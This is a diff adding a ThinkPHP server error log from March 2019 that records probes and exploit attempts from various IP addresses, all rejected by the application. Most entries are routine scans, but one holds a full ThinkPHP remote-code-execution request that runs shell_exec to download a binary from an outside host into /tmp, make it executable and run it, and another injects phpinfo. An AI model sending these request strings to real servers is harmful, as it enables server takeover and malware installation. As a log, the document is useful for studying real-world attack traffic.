@@ -1,0 +1,27 @@
+[ 2019-03-10T01:45:53+08:00 ] 92.63.107.179 /index.php?s=index/think%5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=1
+ERR: 非法操作:think\app
+
+[ 2019-03-10T01:45:54+08:00 ] 31.184.252.69 /index.php?s=/module/aciton/param1/$%7B@phpinfo()%7D
+ERR: 无法加载控制器:Module
+
+[ 2019-03-10T13:33:35+08:00 ] 185.142.236.34 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2019-03-10T13:33:39+08:00 ] 185.142.236.34 /sitemap.xml
+ERR: 无法加载控制器:Sitemap.xml
+
+[ 2019-03-10T14:37:51+08:00 ] 203.148.249.190 /webdav/
+ERR: 无法加载控制器:Webdav
+
+[ 2019-03-10T14:40:30+08:00 ] 203.148.249.190 /manager/html
+ERR: 无法加载控制器:Manager
+
+[ 2019-03-10T15:10:03+08:00 ] 74.63.217.234 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
+[ 2019-03-10T19:36:44+08:00 ] 134.209.56.187 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http%3A%2F%2F157.230.168.17%2Fbins%2Fapep.x86%20-O%20%2Ftmp%2F.gayboi%3B%20chmod%20777%20%2Ftmp%2F.gayboi%3B%20%2Ftmp%2F.gayboi%20thinkphp.x86
+ERR: 非法操作:\think\app
+
+[ 2019-03-10T20:45:49+08:00 ] 216.245.197.254 /robots.txt
+ERR: 无法加载控制器:Robots.txt
+
